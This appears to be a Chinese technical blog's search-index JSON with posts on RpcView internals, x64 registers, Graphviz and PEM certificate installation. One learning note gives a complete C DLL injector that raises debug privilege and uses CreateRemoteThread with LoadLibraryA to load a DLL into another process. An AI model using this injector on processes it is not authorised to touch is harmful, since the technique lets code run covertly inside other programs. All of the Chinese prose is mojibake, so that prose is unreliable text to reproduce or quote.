é€»è¾‘ã€è§„èŒƒç­‰ï¼Œéƒ½æ¯”è¾ƒæœ‰å‚è€ƒæ„ä¹‰ã€‚ æœ¬æ–‡ä¸»è¦æ˜¯çœ‹åŠŸèƒ½éƒ¨åˆ†ï¼Œç•Œé¢éƒ¨åˆ†æš‚ä¸æ¶‰åŠã€‚ 0x02 Rpcæ‰«æ å¯ä»¥çœ‹å‡ºæ¥ RpcView è¿™æ¬¾è½¯ä»¶çš„å¼ºå¤§ä¹‹å¤„å“ˆï¼Œrpcçš„æ‰€æœ‰ä¿¡æ¯éƒ½å¯ä»¥æ‹¿åˆ°ã€‚ æ‰«æé€»è¾‘ ä¸€ä¸ªåŸºç¡€æ¦‚å¿µï¼šPEæ–‡ä»¶ç»“æ„ï¼šDOSå¤´+PEå¤´+èŠ‚è¡¨+.data/.rdata/.text ç®€å•ç”»ä¸ª flow çœ‹ä¸‹ RpcView çš„ç›¸å…³è°ƒç”¨æµç¨‹,ä»¥è·å–ä¸€ä¸ªè¿›ç¨‹ä¸ºä¾‹ï¼ˆä»…æ¶‰åŠrpcéƒ¨åˆ†ï¼Œå…¶ä»–ä¿¡æ¯è·å–é€»è¾‘çœ‹æºç å³å¯ï¼Œè¡¥å……ä¸€ç¯‡æ•´ç†çš„PEç›¸å…³çš„æ–‡ç«  windowsï¼šã€PEã€‘PEæ–‡ä»¶ç»“æ„ï¼ˆä¸€ï¼‰ - ooneï¼‰ã€‚ flowchart LR A[RpcCoreGetProcessInfo\\nè·å–ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯,åŒ…æ‹¬rpcä¿¡æ¯] --> B[GetRpcServerAddressInProcess\\nè·å–rpcä¿¡æ¯ç»“æ„ä½“ pRpcCoreInternalCtxt] B --> C[GetModuleDataSection\\nè·å–RPCRT4.dllçš„.dataæ•°æ®æ®µ ModuleSectionInfo] C --> D[é€šè¿‡ ModuleSectionInfo.pBaseè·å– RpcServer] D --> E[é€šè¿‡è·å–çš„ RpcServer ä¸ RpcInterface \\næ¯”è¾ƒåˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦ä¸º RPCserver] ä¸Šè¿°æµç¨‹å°±è·å–åˆ°äº†ä¸€ä¸ªè¿›ç¨‹ä¸­æ˜¯å¦å«æœ‰RPCæœåŠ¡ï¼Œå¹¶ä¸”å¦‚æœæœ‰çš„è¯ï¼Œå¯ä»¥å€Ÿ RPCserver è·å–RPCçš„ç›¸å…³ä¿¡æ¯ã€‚ pRpcCoreInternalCtxt ç»“æ„ä½“ 1234typedef struct _RpcCoreInternalCtxt_T&#123; VOID* pGlobalRpcServer; UINT64 ModuleVersion;&#125;RpcCoreInternalCtxt_T; ModuleSectionInfo ç»“æ„ä½“ 1234typedef struct _ModuleSectionInfo_T&#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T; RpcServer ç»“æ„ä½“ 1234567891011121314151617181920212223242526272829typedef struct _RPC_SERVER_T&#123; MUTEX_T MUTEX; ULONG Unk1; ULONG Unk2; BOOL bIsListening; ULONG MinimumCallThreads; ULONG bWait; ULONG OutCalls; ULONG Unk3; ULONG InCalls; SIMPLE_DICT_T AddressDict; ULONG Unk3_; SIMPLE_DICT_T _ProtSeqQueue; ULONG Unk4[4]; ULONG OutPackets; ULONG Unk5; MUTEX_T Mutex2; ULONG MaxCalls; VOID PTR_T hEvent; ULONG Unk6[6]; SIMPLE_DICT_T InterfaceDict; BOOL ___bIsListening; BOOL bIsListenMaxCallsDefault; ULONG Unk7[6]; ULONG InPackets; RPC_FORWARD_FUNCTION PTR_T pRpcForwardFunction; ULONG Unk8[6]; SIMPLE_DICT_T AuthenInfoDict;&#125;RPC_SERVER_T, PTR_T PRPC_SERVER_T; RpcInterface ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021typedef struct _RPC_INTERFACE_T&#123; RPC_SERVER_T PTR_T pRpcServer; ULONG Flags; ULONG EpMapperFlags; RPC_MGR_EPV PTR_T pMgrEpv; RPC_IF_CALLBACK_FN PTR_T IfCallbackFn; RPC_SERVER_INTERFACE_T RpcServerInterface; ULONG pSyntaxInfo; ULONG pTransfertSyntaxes; ULONG pTransfertSyntaxesCount; ULONG Unk1; ULONG NbTypeManager; ULONG MaxRpcSize; ULONG Unk2; ULONG pUuidVector; SIMPLE_DICT_T RpcInterfaceManagerDict; UCHAR Annotation[MAX_RPC_INTERFACE_ANNOTATION]; SIMPLE_DICT_T FwEpDict; ULONG Unk3[6];&#125;RPC_INTERFACE_T, PTR_T PRPC_INTERFACE_T; 0x03 RpcCore æœ¬ç« ä¸»è¦æè¿°ä¸Šè¿°æ£€æµ‹æµç¨‹ï¼Œä»¥åŠrpcviewæ˜¯å¦‚æœå·¥ä½œæ‹¿åˆ°ç›¸å…³ä¿¡æ¯çš„ã€‚ NDR ç›¸å…³å¯æŸ¥å®˜æ–¹æ–‡æ¡£ï¼šMIDL_STUB_DESC (rpcndr.h) - Win32 apps | Microsoft Learn","tags":[{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"}]},{"title":"ã€winapiã€‘è¿œç¨‹åŠ è½½å’Œé‡Šæ”¾DLL","date":"2023-11-05T16:00:00.000Z","path":"A_OS/Windows/API/CreateRemoteThread/ã€winapiã€‘è¿œç¨‹åŠ è½½å’Œé‡Šæ”¾DLL/","text":"æ¦‚è¿°ï¼šè¿œç¨‹åŠ è½½å’Œé‡Šæ”¾DLLï¼Œä»…è®°å½•å­¦ä¹ ç¬”è®°ï¼Œæ— å‚è€ƒæ„ä¹‰ã€‚ CreateRemoteThread çš„ç”¨æ³•å‚è€ƒæ–‡ç«  CreateRemoteThreadçš„ç®€å•ä½¿ç”¨ è¯´æ˜ ä¸»è¦å°±æ˜¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è°ƒç”¨ LoadLibrary å’Œ FreeLibrary è¿™ä¸¤ä¸ªå‡½æ•°ã€‚æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œä¼šä»¥ä¸‹å‡ ä¸ªAPIå°±å¯ä»¥ CreateRemoteThread LoadLibrary Freelibrary OpenProcess VirtualAllocEx GetProcAddress CreateToolhelp32Snapshot æ³¨æ„ç‚¹ å¸è½½dllæ—¶éœ€è¦åˆ¤æ–­dllæ˜¯å¦å­˜åœ¨ã€‚ éœ€è¦è°ƒç”¨ CreateToolhelp32Snapshot é€šè¿‡ MODULEENTRY32 æšä¸¾è¿›ç¨‹åŠ è½½çš„æ¨¡å—æœ‰å“ªäº›ã€‚MODULEENTRY32 ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º szModuleï¼šæ¨¡å—å szExePathï¼šæ¨¡å—åŠ è½½çš„è·¯å¾„ 123456789101112131415typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32;typedef MODULEENTRY32 * PMODULEENTRY32;typedef MODULEENTRY32 * LPMODULEENTRY32; Code ä»£ç éƒ¨åˆ†åˆ†åˆ«å°è£…äº†ä¸¤ä¸ªå‡½æ•° InjectDll å’Œ FreeDllã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#pragma comment(lib,&quot;Advapi32.lib&quot;) BOOL InjectDll(UINT32 ProcessId, char *DllPath)&#123; if (strstr(DllPath, &quot;\\\\\\\\&quot;) != 0) &#123; printf(&quot;[!]Wrong Dll path\\n&quot;); return FALSE; &#125; if (strstr(DllPath, &quot;\\\\&quot;) == 0) &#123; printf(&quot;[!]Need Dll full path\\n&quot;); return FALSE; &#125; size_t len = strlen(DllPath) + 1; LPVOID pThreadData = NULL; HANDLE ProcessHandle = NULL; HANDLE hThread = NULL; BOOL bRet = FALSE; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; pThreadData = VirtualAllocEx(ProcessHandle, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadData == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]VirtualAllocEx error\\n&quot;); __leave; &#125; BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, DllPath, len, NULL); if (!bWriteOK) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]WriteProcessMemory error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;LoadLibraryA&quot;); hThread = CreateRemoteThread(ProcessHandle, NULL, 0, LoadLibraryAddress, pThreadData, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (pThreadData != NULL) VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE); if (hThread != NULL) CloseHandle(hThread); if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125;BOOL FreeDll(UINT32 ProcessId, char *DllFullPath)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; BOOL bSuccess = FALSE; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId); bMore = Module32First(hSnapshot, &amp;me); for (; bMore; bMore = Module32Next(hSnapshot, &amp;me)) &#123; if (!_tcsicmp((LPCTSTR)me.szModule, DllFullPath) || !_tcsicmp((LPCTSTR)me.szExePath, DllFullPath)) &#123; bFound = TRUE; break; &#125; &#125; if (!bFound) &#123; CloseHandle(hSnapshot); return FALSE; &#125; BOOL bRet = FALSE; HANDLE ProcessHandle = NULL; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;FreeLibrary&quot;); HANDLE hThread = NULL; hThread = CreateRemoteThread(ProcessHandle, NULL, 0, FreeLibraryAddress, me.modBaseAddr, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125;BOOL EnableDebugPrivilege(BOOL fEnable)&#123; BOOL fOk = FALSE; HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); &#125; return(fOk);&#125;int main(int argc, char *argv[])&#123; if (argc != 3) &#123; printf(&quot;Use CreateRemoteThread to inject dll,usually used under XP.\\n\\n&quot;); printf(&quot;Usage:\\n&quot;); printf(&quot;%s &lt;PID&gt; &lt;Dll Path&gt;\\n&quot;, argv[0]); return 0; &#125; if (!EnableDebugPrivilege(TRUE)) &#123; printf(&quot;[!]AdjustTokenPrivileges Failed.&lt;%d&gt;\\n&quot;, GetLastError()); &#125; if (!InjectDll((DWORD)atoi(argv[1]), argv[2])) &#123; printf(&quot;[!]InjectDll error \\n&quot;); return 1; &#125; if (!FreeDll((DWORD)atoi(argv[1]), argv[2])) &#123; printf(&quot;[!]FreeDll error \\n&quot;); return 1; &#125; printf(&quot;[+]InjectDll success\\n&quot;); return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/CreateRemoteThread/"}]},{"title":"ã€æ±‡ç¼–ã€‘å¯„å­˜å™¨ç›¸å…³","date":"2023-11-02T16:00:00.000Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘å¯„å­˜å™¨ç›¸å…³/","text":"æ¦‚è¿°ï¼šå¯„å­˜å™¨ç›¸å…³æ•´ç† [toc] å¯„å­˜å™¨çš„æ˜“å¤±æ€§å’Œä¿å­˜æ–¹å¼ ä¸‹è¡¨è¯´æ˜äº†æ¯ç§å¯„å­˜å™¨åœ¨æ•´ä¸ªå‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„ä½¿ç”¨æ–¹æ³•ï¼š å±•å¼€è¡¨ æ³¨å†Œ çŠ¶æ€ ä½¿ç”¨ RAX æ˜“å¤±çš„ è¿”å›å€¼å¯„å­˜å™¨ RCX æ˜“å¤±çš„ ç¬¬ä¸€ä¸ªæ•´å‹è‡ªå˜é‡ RDX æ˜“å¤±çš„ ç¬¬äºŒä¸ªæ•´å‹è‡ªå˜é‡ R8 æ˜“å¤±çš„ ç¬¬ä¸‰ä¸ªæ•´å‹è‡ªå˜é‡ R9 æ˜“å¤±çš„ ç¬¬å››ä¸ªæ•´å‹è‡ªå˜é‡ R10:R11 æ˜“å¤±çš„ å¿…é¡»æ ¹æ®éœ€è¦ç”±è°ƒç”¨æ–¹ä¿ç•™ï¼›åœ¨ syscall/sysret æŒ‡ä»¤ä¸­ä½¿ç”¨ R12:R15 éæ˜“å¤±çš„ å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ RDI éæ˜“å¤±çš„ å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ RSI éæ˜“å¤±çš„ å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ RBX éæ˜“å¤±çš„ å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ RBP éæ˜“å¤±çš„ å¯ç”¨ä½œå¸§æŒ‡é’ˆï¼›å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ RSP éæ˜“å¤±çš„ å †æ ˆæŒ‡é’ˆ XMM0ã€YMM0 æ˜“å¤±çš„ ç¬¬ä¸€ä¸ª FP å‚æ•°ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬ä¸€ä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM1ã€YMM1 æ˜“å¤±çš„ ç¬¬äºŒä¸ª FP å‚æ•°ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬äºŒä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM2ã€YMM2 æ˜“å¤±çš„ ç¬¬ä¸‰ä¸ª FP å‚æ•°ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬ä¸‰ä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM3ã€YMM3 æ˜“å¤±çš„ ç¬¬å››ä¸ª FP å‚æ•°ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬å››ä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM4ã€YMM4 æ˜“å¤±çš„ å¿…é¡»æ ¹æ®è°ƒç”¨æ–¹çš„éœ€è¦ä¿ç•™ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬äº”ä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM5ã€YMM5 æ˜“å¤±çš„ å¿…é¡»æ ¹æ®è°ƒç”¨æ–¹çš„éœ€è¦ä¿ç•™ï¼›ä½¿ç”¨ __vectorcall æ—¶çš„ç¬¬å…­ä¸ªçŸ¢é‡ç±»å‹å‚æ•° XMM6:XMM15ã€YMM6:YMM15 éæ˜“å¤±çš„ (XMM)ï¼Œæ˜“å¤±çš„ï¼ˆYMM çš„ä¸ŠåŠéƒ¨åˆ†ï¼‰ å¿…é¡»ç”±è¢«è°ƒç”¨æ–¹ä¿ç•™ã€‚ YMM å¯„å­˜å™¨å¿…é¡»æ ¹æ®éœ€è¦ç”±è°ƒç”¨æ–¹ä¿ç•™ã€‚ å½“å‡½æ•°è¿›å…¥å’Œé€€å‡º C è¿è¡Œæ—¶åº“è°ƒç”¨å’Œ Windows ç³»ç»Ÿè°ƒç”¨æ—¶ï¼ŒCPU æ ‡å¿—å¯„å­˜å™¨çš„æ–¹å‘ä½æ ‡å¿—å°†è¢«æ¸…é™¤ã€‚ æ®µå¯„å­˜å™¨ å››ä¸ª[æ®µå¯„å­˜å™¨](ã€æ±‡ç¼–ã€‘ã€å®éªŒæ¥¼ã€‘æ±‡ç¼–æ•™ç¨‹ç¬”è®° #8086 å¯„å­˜å™¨ç»„)ï¼Œåˆ†åˆ«æ˜¯ CS ä»£ç æ®µå¯„å­˜å™¨ã€DS æ•°æ®æ®µå¯„å­˜å™¨ã€ES é™„åŠ æ®µå¯„å­˜å™¨ã€SS å †æ ˆæ®µå¯„å­˜å™¨ã€‚ CS å­˜æ”¾å½“å‰æ­£åœ¨è¿è¡Œçš„ç¨‹åºä»£ç æ‰€åœ¨æ®µçš„æ®µåŸºå€ï¼Œè¡¨ç¤ºå½“å‰ä½¿ç”¨çš„æŒ‡ä»¤ä»£ç å¯ä»¥ä»è¯¥æ®µå¯„å­˜å™¨æŒ‡å®šçš„å­˜å‚¨å™¨æ®µä¸­å–å¾—ï¼Œç›¸åº”çš„åç§»é‡åˆ™ç”±IPæä¾›ã€‚ SS DS ES FS fs æ˜¯ 80386 èµ·å¢åŠ çš„ä¸¤ä¸ªè¾…åŠ©æ®µå¯„å­˜å™¨ä¹‹ä¸€,åœ¨è¿™ä¹‹å‰åªæœ‰ä¸€ä¸ªè¾…åŠ©æ®µå¯„å­˜å™¨ES FSå¯„å­˜å™¨æŒ‡å‘å½“å‰æ´»åŠ¨çº¿ç¨‹çš„TEBç»“æ„ï¼ˆçº¿ç¨‹ç»“æ„ï¼‰ åç§» è¯´æ˜ 00 åªæƒ³SEHé“¾è¡¨æŒ‡é’ˆ 04 çº¿ç¨‹å †æ ˆé¡¶éƒ¨ï¼ˆåœ°å€æœ€å°ï¼‰ 08 çº¿ç¨‹å †æ ˆåº•éƒ¨ï¼ˆåœ°å€æœ€å¤§ï¼‰ 0c SubSystemTib 10 FiberData 14 ArbitraryUserPointer 18 FS æ®µå¯„å­˜å™¨åœ¨å†…å­˜ä¸­çš„é•œåƒ 20 è¿›ç¨‹PID 24 çº¿ç¨‹ID 2c æŒ‡å‘çº¿ç¨‹å±€éƒ¨å­˜å‚¨çš„æŒ‡é’ˆ 30 PEBç»“æ„åœ°å€ï¼ˆè¿›ç¨‹ç»“æ„ï¼‰ 34 ä¸Šä¸€ä¸ªé”™è¯¯ï¼ˆLastError) GS","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"},{"name":"å¯„å­˜å™¨","slug":"å¯„å­˜å™¨","permalink":"https://hodlyounger.github.io/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€å·¥å…·ã€‘ä½¿ç”¨ GraphViz ç”»å›¾","date":"2023-11-01T02:50:09.593Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘Graphvizç”»å›¾/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ GraphViz ç”»å›¾ Example: Graphviz (dot) examples [toc] Dot å‘½ä»¤ dotæ¸²æŸ“æˆå…¶ä»–æ–‡ä»¶å‘½ä»¤ï¼š Command Line | Graphviz 1dot -Tsvg input.dot ä¸­æ–‡ä¹±ç é—®é¢˜ éœ€è¦è®¾ç½®å­—ä½“ 1fontname=&quot;Microsoft Yahei&quot; Attributes Attributes | Graphviz cluster Whether the subgraph is a cluster 1234567891011121314151617181920212223digraph cats &#123; subgraph cluster_big_cats &#123; // This subgraph is a cluster, because the name begins with &quot;cluster&quot; &quot;Lion&quot;; &quot;Snow Leopard&quot;; &#125; subgraph domestic_cats &#123; // This subgraph is also a cluster, because cluster=true. cluster=true; &quot;Siamese&quot;; &quot;Persian&quot;; &#125; subgraph not_a_cluster &#123; // This subgraph is not a cluster, because it doesn&#x27;t start with &quot;cluster&quot;, // nor sets cluster=true. &quot;Wildcat&quot;; &#125;&#125; colorscheme A color scheme namespace: the context for interpreting color names 123456789101112graph &#123; node [colorscheme=oranges9] # Apply colorscheme to all nodes 1 [color=1] 2 [color=2] 3 [color=3] 4 [color=4] 5 [color=5] 6 [color=6] 7 [color=7] 8 [color=8] 9 [color=9]&#125; compound If true, allow edges between clusters 123456789101112131415161718digraph &#123; compound=true; subgraph cluster_a &#123; label=&quot;Cluster A&quot;; node1; node3; node5; node7; &#125; subgraph cluster_b &#123; label=&quot;Cluster B&quot;; node2; node4; node6; node8; &#125; node1 -&gt; node2 [label=&quot;1&quot;]; node3 -&gt; node4 [label=&quot;2&quot; ltail=&quot;cluster_a&quot;]; node5 -&gt; node6 [label=&quot;3&quot; lhead=&quot;cluster_b&quot;]; node7 -&gt; node8 [label=&quot;4&quot; ltail=&quot;cluster_a&quot; lhead=&quot;cluster_b&quot;];&#125; concentrate If true, use edge concentrators 123456digraph &#123; concentrate=true a -&gt; b [label=&quot;1&quot;] c -&gt; b d -&gt; b&#125; constraint If false, the edge is not used in ranking the nodes 12345digraph G &#123; a -&gt; c; a -&gt; b; b -&gt; c [constraint=false];&#125; ä½¿ç”¨GraphViaç”»ç»“æ„ä½“ ä½¿ç”¨DEMO 12345678digraph structs &#123; node [shape=record]; struct1 [label=&quot;&lt;f0&gt; left|&lt;f1&gt; mid&amp;#92; dle|&lt;f2&gt; right&quot;]; struct2 [label=&quot;&lt;f0&gt; one|&lt;f1&gt; two&quot;]; struct3 [label=&quot;hello&amp;#92;nworld |&#123; b |&#123;c|&lt;here&gt; d|e&#125;| f&#125;| g | h&quot;]; struct1:f1 -&gt; struct2:f0; struct1:f2 -&gt; struct3:here;&#125;","tags":[{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"Graphviz","slug":"Graphviz","permalink":"https://hodlyounger.github.io/tags/Graphviz/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€PEMã€‘å®‰è£…PEMæ–‡ä»¶","date":"2023-10-27T01:24:02.562Z","path":"Z_æ‚è®°/ã€PEMã€‘å®‰è£…PEMæ–‡ä»¶/","text":"æ¦‚è¿°ï¼š windowså’ŒLinuxå®‰è£…PEMæ–‡ä»¶æ­¥éª¤ [toc] å¦‚ä½•å®‰è£…PEMè¯ä¹¦ æ›´æ–°ï¼š2023-05-29 21:11 PEMè¯ä¹¦æ˜¯ä¸€ç§å¸¸è§çš„è¯ä¹¦æ–‡ä»¶æ ¼å¼ï¼Œé€šå¸¸ç”¨äºåŠ å¯†ã€éªŒè¯å’Œèº«ä»½è®¤è¯ç­‰ã€‚åœ¨è¿è¡Œåº”ç”¨ç¨‹åºæˆ–æœåŠ¡æ—¶ï¼Œæœ‰æ—¶éœ€è¦å°†PEMè¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿæˆ–è®¾å¤‡ä¸­ï¼Œå¹¶ç¡®ä¿å…¶æ­£ç¡®é…ç½®ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•å®‰è£…PEMè¯ä¹¦ã€‚ 1. ä¸‹è½½PEMè¯ä¹¦æ–‡ä»¶ é¦–å…ˆï¼Œæ‚¨éœ€è¦æœ‰PEMè¯ä¹¦æ–‡ä»¶ã€‚å®ƒå¯ä»¥æ˜¯è‡ªç­¾åè¯ä¹¦ã€å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨è¯ä¹¦ã€æ ¹è¯ä¹¦æˆ–ä¸­é—´è¯ä¹¦ã€‚æ‚¨å¯ä»¥ä»è®¸å¤šæ¥æºè·å–PEMè¯ä¹¦æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š è¯ä¹¦é¢å‘æœºæ„ (CA) å‚å•†æä¾›çš„PEMè¯ä¹¦ è‡ªå·±åˆ›å»ºçš„PEMè¯ä¹¦æ–‡ä»¶ ç¡®ä¿æ‚¨å·²ç»è·å¾—PEMè¯ä¹¦æ–‡ä»¶å¹¶å°†å…¶ä¸‹è½½åˆ°è®¡ç®—æœºçš„æœ¬åœ°æ–‡ä»¶å¤¹ä¸­ã€‚ 2. å®‰è£…PEMè¯ä¹¦æ–‡ä»¶ 2.1 åœ¨Linuxç³»ç»Ÿä¸Šå®‰è£…PEMè¯ä¹¦ å¦‚æœæ‚¨æƒ³åœ¨Linuxç³»ç»Ÿä¸Šå®‰è£…PEMè¯ä¹¦ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ï¼š 12sudo cp server.crt /usr/local/share/ca-certificates/sudo update-ca-certificates åœ¨ä¸Šè¿°å‘½ä»¤ä¸­ï¼Œâ€œserver.crtâ€æ˜¯æ‚¨çš„PEMè¯ä¹¦æ–‡ä»¶åã€‚é€šè¿‡å°†PEMè¯ä¹¦æ–‡ä»¶å¤åˆ¶åˆ°â€œ/usr/local/share/ca-certificates/â€ç›®å½•ï¼Œæ‚¨å¯ä»¥å°†PEMè¯ä¹¦æ·»åŠ åˆ°ç³»ç»Ÿçš„å¯ä¿¡è¯ä¹¦åˆ—è¡¨ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œè¿è¡Œâ€œsudo update-ca-certificatesâ€å‘½ä»¤ä»¥æ›´æ–°è¯ä¹¦åˆ—è¡¨å¹¶ä½¿å…¶ç”Ÿæ•ˆã€‚ 2.2 åœ¨Windowsç³»ç»Ÿä¸Šå®‰è£…PEMè¯ä¹¦ æ–¹å¼ä¸€ å¦‚æœæ‚¨æƒ³åœ¨Windowsç³»ç»Ÿä¸Šå®‰è£…PEMè¯ä¹¦ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ï¼š åŒå‡»PEMè¯ä¹¦æ–‡ä»¶ï¼Œæ‰“å¼€è¯ä¹¦å‘å¯¼ã€‚ åœ¨å¼¹å‡ºçª—å£ä¸­ï¼Œé€‰æ‹©â€œå®‰è£…è¯ä¹¦â€é€‰é¡¹ï¼Œå¹¶å•å‡»â€œä¸‹ä¸€æ­¥â€ã€‚ é€‰æ‹©â€œè®¡ç®—æœºå¸æˆ·â€é€‰é¡¹ï¼Œå¹¶å•å‡»â€œä¸‹ä¸€æ­¥â€ã€‚ åœ¨â€œé€‰æ‹©å­˜å‚¨ä½ç½®â€çª—å£ä¸­ï¼Œé€‰æ‹©â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€é€‰é¡¹ï¼Œå¹¶å•å‡»â€œä¸‹ä¸€æ­¥â€ã€‚ å•å‡»â€œä¸‹ä¸€æ­¥â€ä»¥ç¡®è®¤é€‰é¡¹ï¼Œå¹¶å•å‡»â€œå®Œæˆâ€ä»¥å®Œæˆè¯ä¹¦å®‰è£…ã€‚ ç°åœ¨ï¼Œæ‚¨çš„PEMè¯ä¹¦å·²ç»å®‰è£…åœ¨æ‚¨çš„Windowsç³»ç»Ÿä¸­ã€‚ æ–¹å¼äºŒ 1æ‰“å¼€æ§åˆ¶é¢æ¿ -&gt; ç½‘ç»œè®¾ç½® -&gt; Interneté€‰é¡¹ -&gt; å†…å®¹ -&gt; è¯ä¹¦ -&gt; å¯¼å…¥ 